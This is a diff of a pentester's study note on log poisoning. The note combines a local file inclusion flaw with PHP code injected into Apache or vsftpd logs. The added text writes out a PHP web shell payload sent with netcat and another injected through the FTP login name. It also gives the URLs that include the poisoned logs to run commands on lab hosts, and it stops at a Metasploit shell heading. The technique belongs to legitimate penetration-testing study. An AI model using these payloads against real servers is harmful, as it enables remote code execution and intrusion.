@@ -10,20 +10,42 @@ Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
 Links: {Add link(s) [[]] to related terms}
 Search Tag: #📕  
 
-# [[FTP log poisoning]]  
+# [[log poisoning]]  
 ___
 
 ## Description:  
 
+### Web sever log poisoning
+
+Can you access `C:\xampp\apache\logs\access.log` or any other logs files? You can try to Poisoning log files. For example:
+Connect to the web server with ssh and send it a php script:
+```
+kali@kali:~$ nc -nv 10.11.0.22 80
+(UNKNOWN) [10.11.0.22] 80 (http) open
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+HTTP/1.1 400 Bad Request
+```
+
+Next, we’ll use the LFI vulnerability to include the Apache access.log file that contains our PHP 
+payload. We know the application is using an include statement so the contents of the included file 
+will be executed as PHP code.
+```
+http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+```
+
+
+### FTP Log Poisoning
 Server must be running ftp and have a LFI vuln.
  
 Connect to the ftp server and run in the name field:
 `'<?php system($_GET['c']); ?>'`
 
+Now use your LFI to access the logs of the FTP server to run commands:
+
 add a &c=command to the end of your URL to run commands:
 `http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=ifconfig`
 
-### metasploit shell
+### Metasploit shell
 Use web delivery to get a shell
 
 ```
